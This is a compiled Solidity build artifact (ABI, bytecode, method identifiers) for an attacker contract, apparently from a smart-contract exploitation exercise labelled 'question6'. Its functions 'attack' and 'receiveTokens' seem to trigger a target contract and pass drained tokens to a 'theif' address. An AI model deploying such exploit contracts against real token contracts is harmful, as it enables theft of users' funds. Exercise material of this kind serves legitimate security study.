{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "question6Address",
          "type": "address"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "tokenAddress",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "theif",
          "type": "address"
        }
      ],
      "name": "receiveTokens",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": {
    "object": "0x608060405234801561001057600080fd5b506102cf806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806343da2f421461003b578063d018db3e14610050575b600080fd5b61004e610049366004610215565b610063565b005b61004e61005e366004610248565b61015d565b6040516001600160a01b0382166024820152670de0b6b3a7640000604482015260009060640160408051601f198184030181529181526020820180516001600160e01b031663a9059cbb60e01b179052519091506000906001600160a01b038516906100d090849061026a565b6000604051808303816000865af19150503d806000811461010d576040519150601f19603f3d011682016040523d82523d6000602084013e610112565b606091505b50509050806101575760405162461bcd60e51b815260206004820152600d60248201526c1c9958da5d994819985a5b1959609a1b604482015260640160405180910390fd5b50505050565b60405130602482015260009060440160408051601f198184030181529181526020820180516001600160e01b0316636bc26a1360e11b179052519091506001600160a01b038316906101b090839061026a565b6000604051808303816000865af19150503d80600081146101ed576040519150601f19603f3d011682016040523d82523d6000602084013e6101f2565b606091505b5050505050565b80356001600160a01b038116811461021057600080fd5b919050565b6000806040838503121561022857600080fd5b610231836101f9565b915061023f602084016101f9565b90509250929050565b60006020828403121561025a57600080fd5b610263826101f9565b9392505050565b6000825160005b8181101561028b5760208186018101518583015201610271565b50600092019182525091905056fea26469706673582212202c67eecaa99d80fd9f8ba93fc9517f5cd3b2356e3c919a821f7d7b0c73f1f74264736f6c63430008110033",
    "linkReferences": {}
  },
  "methodIdentifiers": {
    "attack(address)": "d018db3e",
    "receiveTokens(address,address)": "43da2f42"
  },
  "id": 26
}